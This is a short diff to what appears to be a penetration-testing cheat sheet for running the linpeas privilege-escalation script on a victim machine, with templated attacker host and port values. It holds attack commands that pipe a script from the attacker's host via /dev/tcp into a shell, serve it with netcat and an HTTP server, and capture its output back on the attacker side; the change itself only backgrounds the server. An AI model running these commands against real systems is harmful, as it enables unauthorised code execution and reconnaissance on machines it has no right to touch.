@@ -21,7 +21,7 @@ sudo nc -q 5 -lvnp #{LPORT} < linpeas.sh
 cat < /dev/tcp/#{LHOST}/#{LPORT} | sh
 
 # desc: Excute from memory and send output back to the host (Attacker)
-python3 -m http.server #{LPORT}
+python3 -m http.server #{LPORT} &
 nc -lvnp #{lport_2} | tee linpeas.out
 
 # desc: Victim
